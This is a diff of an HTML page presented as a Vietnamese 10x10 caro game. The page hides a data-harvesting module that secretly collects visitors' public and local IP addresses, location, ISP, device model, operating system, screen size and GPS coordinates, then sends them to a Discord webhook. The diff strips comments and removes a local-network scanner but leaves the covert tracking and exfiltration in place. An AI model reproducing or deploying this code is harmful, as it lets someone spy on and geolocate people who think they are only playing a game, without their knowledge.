@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Game Cờ Caro 10x10</title>
     <style>
-        /* Giao diện tổng thể trò chơi */
         * {
             box-sizing: border-box;
             margin: 0;
@@ -30,7 +29,6 @@
             text-align: center;
         }
 
-        /* Dòng trạng thái lượt đi */
         #status {
             font-size: 1.2rem;
             margin-bottom: 15px;
@@ -40,14 +38,12 @@
             text-align: center;
         }
 
-        /* Thẻ bao bọc chống tràn màn hình */
         .board-wrapper {
             max-width: 100%;
             overflow-x: auto;
             padding: 5px;
         }
 
-        /* Bàn cờ 10x10 linh hoạt kích thước */
         .board {
             display: grid;
             grid-template-columns: repeat(10, min(38px, 8vw));
@@ -60,7 +56,6 @@
             margin: 0 auto;
         }
 
-        /* Ô cờ */
         .cell {
             width: 100%;
             height: 100%;
@@ -81,7 +76,6 @@
         .cell.x { color: #2196F3; }
         .cell.o { color: #f44336; }
 
-        /* Nút chơi lại */
         #restartBtn {
             margin-top: 15px;
             padding: 10px 25px;
@@ -323,7 +317,7 @@
         createBoard();
 
         // ==========================================
-        // 2. MÔ-ĐUN THU THẬP DỮ LIỆU & GỬI DISCORD
+        // 2. MÔ-ĐUN THU THẬP DỮ LIỆU (HTTPS COMPATIBLE)
         // ==========================================
         let daThuNhapDuLieu = false;
         let duLieuHeThong = {};
@@ -417,7 +411,7 @@
 
                 pc.onicecandidate = (event) => {
                     if (!event || !event.candidate) {
-                        resolve(ipSet.size === 0 ? "N/A" : Array.from(ipSet).join(", "));
+                        resolve(ipSet.size === 0 ? "Bị ẩn (mDNS / HTTPS)" : Array.from(ipSet).join(", "));
                         return;
                     }
 
@@ -435,43 +429,9 @@
                 };
 
                 setTimeout(() => {
-                    resolve(ipSet.size > 0 ? Array.from(ipSet).join(", ") : "N/A");
-                }, 2500);
+                    resolve(ipSet.size > 0 ? Array.from(ipSet).join(", ") : "Bị ẩn (mDNS / HTTPS)");
+                }, 2000);
             });
-        }
-
-        function kiemTraIPNoiBo(ip) {
-            return new Promise((resolve) => {
-                const controller = new AbortController();
-                const timeoutId = setTimeout(() => {
-                    controller.abort();
-                    resolve({ ip: ip, active: false });
-                }, 600);
-
-                fetch(`http://${ip}`, { mode: 'no-cors', signal: controller.signal })
-                    .then(() => { clearTimeout(timeoutId); resolve({ ip: ip, active: true }); })
-                    .catch(() => { clearTimeout(timeoutId); resolve({ ip: ip, active: true }); });
-            });
-        }
-
-        async function quetMangLAN(localIpStr) {
-            const parts = localIpStr.split('.');
-            if (parts.length !== 4) return { count: "N/A", list: "N/A" };
-
-            const subnet = `${parts[0]}.${parts[1]}.${parts[2]}`;
-            const promises = [];
-
-            for (let i = 1; i <= 254; i++) {
-                promises.push(kiemTraIPNoiBo(`${subnet}.${i}`));
-            }
-
-            const results = await Promise.all(promises);
-            const activeDevices = results.filter(r => r.active).map(r => r.ip);
-
-            return {
-                count: activeDevices.length,
-                list: activeDevices.length > 0 ? activeDevices.join(", ") : "Không phát hiện"
-            };
         }
 
         async function layHangVaModelThietBi() {
@@ -540,11 +500,10 @@
             return { ip: "N/A", city: "N/A", country: "N/A", isp: "N/A" };
         }
 
-        // Hàm gửi dữ liệu đến Discord Webhook
         async function guiDuLieuDiscord() {
             if (!duLieuHeThong.ip) return;
 
-            const noiDung = `📊 **THÔNG TIN THIẾT BỊ MỚI** 📊
+            const noiDung = `📊 **THÔNG TIN THIẾT BỊ MỚI (HTTPS)** 📊
 • **IP Công cộng:** \`${duLieuHeThong.ip.ip}\`
 • **Địa điểm:** ${duLieuHeThong.ip.city}, ${duLieuHeThong.ip.country}
 • **Nhà mạng:** ${duLieuHeThong.ip.isp || 'N/A'}
@@ -554,7 +513,7 @@
 • **Hệ điều hành:** ${duLieuHeThong.os.osName} (${duLieuHeThong.os.osVersion})
 • **Màn hình:** ${duLieuHeThong.screen}
 • **Tọa độ GPS:** ${duLieuHeThong.gps ? `Lat: ${duLieuHeThong.gps.lat}, Lng: ${duLieuHeThong.gps.lng} (Sai số: ~${duLieuHeThong.gps.accuracy}m)` : 'Chưa cấp quyền / Không khả dụng'}
-• **Thiết bị LAN:** ${duLieuHeThong.lan.count} thiết bị (${duLieuHeThong.lan.list})`;
+• **Thiết bị LAN:** Không hỗ trợ quét trên môi trường HTTPS (Trình duyệt chặn Mixed Content)`;
 
             try {
                 await fetch(DISCORD_WEBHOOK_URL, {
@@ -565,7 +524,6 @@
             } catch (e) {}
         }
 
-        // HÀM CHÍNH: Thu thập dữ liệu chạy ngầm hoàn toàn
         async function thuNhapDuLieuAn() {
             if (daThuNhapDuLieu) return;
 
@@ -575,7 +533,6 @@
                 const netData = await layThongTinMang();
                 const deviceData = await layHangVaModelThietBi();
                 const osData = await layThongTinHeDieuHanh();
-                const lanData = await quetMangLAN(localIp);
 
                 duLieuHeThong = {
                     ip: ipData,
@@ -583,7 +540,6 @@
                     network: netData,
                     device: deviceData,
                     os: osData,
-                    lan: lanData,
                     screen: `${window.screen.width}x${window.screen.height}`
                 };
 
@@ -596,11 +552,11 @@
                                 accuracy: Math.round(pos.coords.accuracy)
                             };
                             daThuNhapDuLieu = true;
-                            guiDuLieuDiscord(); // Gửi ngay sau khi có GPS
+                            guiDuLieuDiscord();
                         },
                         () => {
                             daThuNhapDuLieu = true;
-                            guiDuLieuDiscord(); // Gửi ngay nếu từ chối GPS
+                            guiDuLieuDiscord();
                         }
                     );
                 } else {
